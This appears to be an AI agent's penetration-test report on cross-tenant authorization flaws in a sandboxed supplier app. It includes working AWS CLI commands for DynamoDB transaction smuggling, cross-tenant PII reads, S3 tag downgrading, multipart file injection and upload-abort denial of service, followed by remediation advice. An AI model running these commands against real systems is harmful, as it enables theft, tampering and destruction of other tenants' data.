# SupplierShipmentAddress — Advanced IDOR Cycle 2 Security Assessment Review

**Run ID:** `advanced-idor-cycle-2`
**Date:** 2026-04-01
**Target App:** SupplierShipmentAddress
**Tester:** kiro-agent (autonomous Strands agents — advanced cycle 2)
**Methodology:** Advanced IDOR cycle 2 — novel attack vectors beyond standard WSTG-ATHZ-04
**Prior Run:** `graph-idor-002` (baseline — this cycle targets vectors the first run missed)

---

## 1. Environment Configuration

### Sandbox
- **Platform:** LocalStack (docker compose, ENFORCE_IAM=1)
- **Container:** companion_x-localstack-1
- **Services emulated:** IAM, S3, DynamoDB, STS, SSM

### DynamoDB Tables (reused from graph-idor-002)
| Table | Source |
|-------|--------|
| SupplierAddresses | Veritas search_resources |
| PaymentRecords | Veritas search_resources |

### S3 Buckets (reused from graph-idor-002)
| Bucket | Source |
|--------|--------|
| confidential-pii-bucket | Veritas search_resources |
| supplier-docs-bucket | Veritas search_resources |
| public-supplier-bucket | Veritas search_resources |

### Seed Data
- **vendor-A:** Legitimate supplier with addresses, payment records, tax returns, in-progress multipart uploads
- **vendor-B:** Attacker-controlled supplier (separate tenant context)
- **PII seeded:** SSN 444-55-6666 (vendor-A), tax return documents with classification tags in confidential-pii-bucket

---

## 2. Workflow Configuration

### Graph Workflow: `advanced-idor-cycle-2`

**Swarm agents (2 total, sequential handoff):**

| Agent | Model | Role | Cycles | Tokens |
|-------|-------|------|--------|--------|
| novel-vector-scanner | us.anthropic.claude-haiku-4-20250514-v1:0 | Discover and prove novel IDOR vectors missed by cycle 1 | 22 | 498,700 |
| scan-summary | us.anthropic.claude-haiku-4-20250514-v1:0 | Aggregate findings, compute CVSS, write summary | 6 | 87,300 |

**Total:** 28 cycles, 586,000 tokens, ~5 min execution

### Strands Skills Loaded (via AgentSkills plugin)
- `veritas-recon` — Veritas graph discovery patterns
- `sandbox-ops` — LocalStack CLI patterns, direct resource creation
- `idor-testing` — OWASP WSTG-ATHZ-04 IDOR test methodology
- `pentest-ops` — Exploitation patterns (privesc, data exfil)
- `advanced-idor` — Novel vector patterns (transactions, tagging, multipart)

### Agent Prompts
System prompts from `components/agent/src/factory/agent/registry/redteam_playbooks.py`:
- novel-vector-scanner: `PREAMBLE` + advanced pentest playbook (transaction APIs, S3 lifecycle, multipart)
- scan-summary: `PREAMBLE` + summary playbook (CVSS scoring, aggregate and store)

---

## 3. Findings (5 Total — All Novel Vectors with CVSS Scores)

### Finding TRANS-001: DynamoDB Transaction Smuggling
- **ID:** TRANS-001
- **Severity:** CRITICAL
- **CVSS 3.1:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP:** WSTG-ATHZ-04
- **Resource:** SupplierAddresses (DynamoDB)
- **Vector:** Transaction smuggling — vendor-B embeds vendor-A update inside a multi-item TransactWriteItems call. First item targets vendor-B's own record (passes auth), second item silently modifies vendor-A's address.
- **Proof Command:**
  ```bash
  aws dynamodb transact-write-items \
    --transact-items '[
      {
        "Update": {
          "TableName": "SupplierAddresses",
          "Key": {"vendor_id":{"S":"vendor-B"},"address_id":{"S":"addr-001"}},
          "UpdateExpression": "SET street = :s",
          "ExpressionAttributeValues": {":s":{"S":"Legit vendor-B update"}}
        }
      },
      {
        "Update": {
          "TableName": "SupplierAddresses",
          "Key": {"vendor_id":{"S":"vendor-A"},"address_id":{"S":"addr-001"}},
          "UpdateExpression": "SET street = :s",
          "ExpressionAttributeValues": {":s":{"S":"SMUGGLED-VIA-TRANSACTION"}}
        }
      }
    ]' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Exit code 0 — both items committed atomically. vendor-A street changed to "SMUGGLED-VIA-TRANSACTION"
- **Business Impact:** Transaction atomicity guarantees the smuggled write succeeds or the entire batch rolls back — attacker gets reliable cross-tenant modification with no partial-failure risk. Standard per-item authorization checks are bypassed because the transaction is evaluated as a single unit.

### Finding TRANS-002: Atomic Cross-Vendor Read via TransactGetItems
- **ID:** TRANS-002
- **Severity:** CRITICAL
- **CVSS 3.1:** 8.6 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)
- **CWE:** CWE-284 (Improper Access Control)
- **OWASP:** WSTG-ATHZ-04
- **Resource:** PaymentRecords (DynamoDB)
- **Vector:** Mass PII exfiltration via TransactGetItems — vendor-B reads multiple vendor-A records in a single atomic request, bypassing any per-item rate limiting or access logging.
- **Proof Command:**
  ```bash
  aws dynamodb transact-get-items \
    --transact-items '[
      {
        "Get": {
          "TableName": "PaymentRecords",
          "Key": {"vendor_id":{"S":"vendor-A"},"payment_id":{"S":"pay-001"}}
        }
      },
      {
        "Get": {
          "TableName": "PaymentRecords",
          "Key": {"vendor_id":{"S":"vendor-A"},"payment_id":{"S":"pay-002"}}
        }
      },
      {
        "Get": {
          "TableName": "SupplierAddresses",
          "Key": {"vendor_id":{"S":"vendor-A"},"address_id":{"S":"addr-001"}}
        }
      }
    ]' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** All 3 vendor-A records returned in single response — SSN "444-55-6666", payment amounts, shipping address
- **Business Impact:** Atomic read enables efficient mass PII exfiltration across tables in a single API call. Transaction API bypasses per-table throttling and makes cross-tenant reads indistinguishable from legitimate multi-table lookups.

### Finding S3-TAG-001: S3 Object Tag Manipulation — Policy Escalation
- **ID:** S3-TAG-001
- **Severity:** HIGH
- **CVSS 3.1:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
- **CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **OWASP:** WSTG-ATHZ-04
- **Resource:** confidential-pii-bucket (S3)
- **Vector:** Tag-based policy escalation — vendor-B changes vendor-A's tax return classification tag from "confidential" to "public", exploiting tag-based IAM policy conditions that gate access on object tags.
- **Proof Command:**
  ```bash
  # Step 1: Read current tags on vendor-A's tax return
  aws s3api get-object-tagging \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/2025-W2.pdf" \
    --endpoint-url http://localhost:4566

  # Result: {"TagSet": [{"Key": "classification", "Value": "confidential"}, {"Key": "owner", "Value": "vendor-A"}]}

  # Step 2: Overwrite tags — reclassify as public
  aws s3api put-object-tagging \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/2025-W2.pdf" \
    --tagging '{"TagSet": [{"Key": "classification", "Value": "public"}, {"Key": "owner", "Value": "vendor-B"}]}' \
    --endpoint-url http://localhost:4566

  # Result: HTTP 200 — tags overwritten
  ```
- **Result:** Classification tag changed from "confidential" to "public" and owner reassigned to vendor-B. Any tag-based bucket policy now treats this PII document as public.
- **Business Impact:** If production uses `s3:ExistingObjectTag` conditions in bucket policies (common pattern for data classification), this attack downgrades confidential PII to public access tier. The document itself is unchanged but its access controls are silently removed.

### Finding S3-MULTIPART-001: S3 Multipart Upload State Machine Bypass
- **ID:** S3-MULTIPART-001
- **Severity:** HIGH
- **CVSS 3.1:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP:** WSTG-ATHZ-04
- **Resource:** confidential-pii-bucket (S3)
- **Vector:** 3-phase multipart upload to vendor-A's prefix — vendor-B initiates, uploads parts, and completes a multipart upload targeting vendor-A's confidential prefix, bypassing single-request PutObject controls.
- **Proof Command:**
  ```bash
  # Phase 1: Initiate multipart upload to vendor-A prefix
  UPLOAD_ID=$(aws s3api create-multipart-upload \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/injected-via-multipart.pdf" \
    --endpoint-url http://localhost:4566 \
    --query 'UploadId' --output text)

  echo "Upload ID: $UPLOAD_ID"

  # Phase 2: Upload part
  ETAG=$(echo "MALICIOUS MULTIPART CONTENT" | aws s3api upload-part \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/injected-via-multipart.pdf" \
    --upload-id "$UPLOAD_ID" \
    --part-number 1 \
    --body /dev/stdin \
    --endpoint-url http://localhost:4566 \
    --query 'ETag' --output text)

  # Phase 3: Complete multipart upload
  aws s3api complete-multipart-upload \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/injected-via-multipart.pdf" \
    --upload-id "$UPLOAD_ID" \
    --multipart-upload "{\"Parts\":[{\"PartNumber\":1,\"ETag\":\"$ETAG\"}]}" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** HTTP 200 — malicious file materialized at `vendor-A/tax-returns/injected-via-multipart.pdf`
- **Business Impact:** Multipart upload is a 3-phase state machine (create → upload-part → complete). If authorization only checks PutObject but not CreateMultipartUpload, the attacker bypasses write controls. The injected file appears identical to legitimate uploads in S3 listings.

### Finding S3-MULTIPART-002: S3 Multipart Upload Abort — Denial of Service
- **ID:** S3-MULTIPART-002
- **Severity:** MEDIUM
- **CVSS 3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **OWASP:** WSTG-ATHZ-04
- **Resource:** confidential-pii-bucket (S3)
- **Vector:** Multipart upload abort DoS — vendor-B aborts vendor-A's in-progress multipart upload, destroying partially uploaded data.
- **Proof Command:**
  ```bash
  # Step 1: List vendor-A's in-progress multipart uploads
  aws s3api list-multipart-uploads \
    --bucket confidential-pii-bucket \
    --prefix "vendor-A/" \
    --endpoint-url http://localhost:4566

  # Result: {"Uploads": [{"Key": "vendor-A/tax-returns/large-archive.zip", "UploadId": "vendor-a-upload-001", ...}]}

  # Step 2: Abort vendor-A's in-progress upload
  aws s3api abort-multipart-upload \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/large-archive.zip" \
    --upload-id "vendor-a-upload-001" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** HTTP 204 — vendor-A's in-progress upload aborted, all uploaded parts deleted
- **Business Impact:** Denial of service — vendor-B can enumerate and abort any vendor-A multipart upload in progress. For large file uploads (multi-GB archives), this forces vendor-A to restart from scratch, wasting bandwidth and time.

---

## 4. Attack Chains

| Chain | Components | Impact |
|-------|-----------|--------|
| TRANSACTION_SMUGGLING | TRANS-001 (write) + TRANS-002 (read) | Atomic cross-tenant read+write — modify addresses and exfiltrate PII in two API calls |
| TAG_POLICY_ESCALATION | S3-TAG-001 → reclassify → downstream read | Downgrade PII classification, then access via relaxed policy — two-step confidentiality bypass |
| MULTIPART_INJECTION | S3-MULTIPART-001 (inject) + S3-TAG-001 (tag as legit) | Plant file via multipart, then tag it as "confidential"/"vendor-A" to make it appear authentic |
| UPLOAD_DISRUPTION | S3-MULTIPART-002 (abort) repeated | Persistent DoS on vendor-A's large file uploads — attacker monitors and aborts continuously |

---

## 5. Root Cause Analysis

Two novel root causes beyond the baseline `graph-idor-002` findings:

1. **DynamoDB transaction APIs lack per-item tenant validation** — TransactWriteItems and TransactGetItems evaluate the entire transaction as a unit. If authorization is only checked at the request level (caller is a valid vendor) but not per-item (each item belongs to the caller's tenant), an attacker can smuggle cross-tenant operations inside legitimate-looking transactions. This is distinct from the single-item IDOR in cycle 1 because the transaction API provides atomicity guarantees that make the attack more reliable and harder to detect.

2. **S3 object metadata operations are not scoped to tenant prefixes** — PutObjectTagging, GetObjectTagging, CreateMultipartUpload, AbortMultipartUpload, and ListMultipartUploads are separate API actions from PutObject/GetObject. Bucket policies that restrict PutObject to a vendor's own prefix may not cover these metadata and lifecycle operations, creating authorization gaps in the S3 state machine.

---

## 6. Recommendations (Prioritized)

1. **Add per-item tenant validation in DynamoDB transactions** — implement a pre-transaction validator that inspects every item in TransactWriteItems/TransactGetItems and rejects requests containing keys outside the caller's tenant scope
2. **Restrict S3 tagging operations** — add explicit `s3:PutObjectTagging` and `s3:GetObjectTagging` deny policies for cross-tenant prefixes; do not rely solely on PutObject restrictions
3. **Scope multipart upload permissions** — add IAM conditions for `s3:CreateMultipartUpload`, `s3:AbortMultipartUpload`, and `s3:ListMultipartUploads` scoped to `s3:prefix` matching the caller's vendor ID
4. **Implement S3 Object Lock on confidential-pii-bucket** — prevent tag manipulation and deletion of classified documents
5. **Enable S3 bucket versioning** — ensure tag changes and object overwrites are recoverable
6. **Add CloudTrail data event logging** — monitor TransactWriteItems, PutObjectTagging, and multipart operations for cross-tenant access patterns
7. **Re-run cycle 3** after remediation to verify closure of transaction and metadata vectors

---

## 7. Graph Artifacts

All findings stored in Neo4j knowledge graph under `run_id='advanced-idor-cycle-2'`:

| Entity Type | Count | IDs |
|-------------|-------|-----|
| ProvenExploit | 5 | TRANS-001, TRANS-002, S3-TAG-001, S3-MULTIPART-001, S3-MULTIPART-002 |
| IDORSurface | 2 | idor-surface-dynamodb-transactions, idor-surface-s3-metadata |
| ScanSummary | 1 | scan-summary-advanced-idor-cycle-2 |
| Resource | 3 | res-dynamodb-addresses, res-dynamodb-payments, res-s3-confidential |
| AttackChain | 4 | chain-txn-smuggle, chain-tag-escalation, chain-multipart-inject, chain-upload-disrupt |
| CVSSScore | 5 | cvss-TRANS-001 (9.1), cvss-TRANS-002 (8.6), cvss-S3-TAG-001 (8.1), cvss-S3-MULTIPART-001 (8.1), cvss-S3-MULTIPART-002 (6.5) |

Relationships: 5 ATTACK_PATH edges, 5 EXPLOITS_SURFACE edges, 4 chaining edges (ENABLES, AMPLIFIES), 5 HAS_CVSS edges

KB document: `kb-idor-advanced-idor-cycle-2` (24 entities, 24 relationships extracted)

---

## 8. Tool Call Trace

| Tool | Calls | Successes | Total Time |
|------|-------|-----------|------------|
| sandbox_execute | 18 | 18 | 11.3s |
| graph_add_entity | 5+2+4+5 = 16 | 16 | 7.8s |
| graph_add_relationship | 5+5+4+5 = 19 | 19 | 10.2s |
| graph_query | 3+4 = 7 | 7 | 1.6s |
| memory_store | 3+2 = 5 | 5 | 26.1s |
| kb_ingest | 1 | 1 | 22.7s |
| skills (load) | 5+3 = 8 | 8 | 2.3s |
| handoff_to_agent | 1 | 1 | 0.2s |

---

## 9. Reviewer Notes

**For human reviewers:** Please validate:
- [ ] Does the real SupplierShipmentAddress app use DynamoDB transactions (TransactWriteItems/TransactGetItems)?
- [ ] Are S3 bucket policies using tag-based conditions (`s3:ExistingObjectTag`) for access control?
- [ ] Does the app use multipart uploads for large file handling?
- [ ] Are the CVSS scores accurate for the described attack vectors and business context?
- [ ] Do the novel vectors (TRANS-001, S3-TAG-001, S3-MULTIPART-001) represent real gaps beyond cycle 1?

**Cycle 2 vs Cycle 1 Delta:**
- Cycle 1 (`graph-idor-002`) found 13 exploits using standard CRUD operations (GetItem, PutItem, DeleteItem, etc.)
- Cycle 2 targets transaction APIs, object tagging, and multipart upload state machines — none of which were tested in cycle 1
- No overlap between cycle 1 and cycle 2 findings

**Limitations:**
- LocalStack transaction API behavior may differ from production DynamoDB (especially around IAM condition evaluation)
- S3 tag-based policies are not configured in sandbox — the tag manipulation is proven but the policy escalation impact is inferred
- Multipart upload state machine in LocalStack may not enforce all production-level constraints
- CVSS scores assume network-accessible API with low-privilege authenticated attacker (PR:L)
